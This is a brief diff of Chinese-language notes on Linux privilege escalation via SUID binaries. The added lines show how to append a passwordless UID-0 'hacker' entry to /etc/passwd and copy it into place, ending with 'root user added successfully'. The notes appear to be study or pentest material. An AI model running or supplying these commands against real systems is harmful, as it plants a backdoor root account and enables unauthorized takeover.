@@ -12,3 +12,6 @@ ls -l 命令目录;查看命令目录是否为suid权限
     1.读任意文件,将敏感信息读出来
     2.篡改用户密码库
         echo 'hacker::0:0::/root:/bin/bash' > /tmp/p：写入公共文件目录
+        cat /etc/passwd /tmp/p > /tmp/passwd.new：将密码文件和新增文件写入
+        cp /tmp/passwd.new /etc/passwd：将文件复制进去
+    添加root用户成功
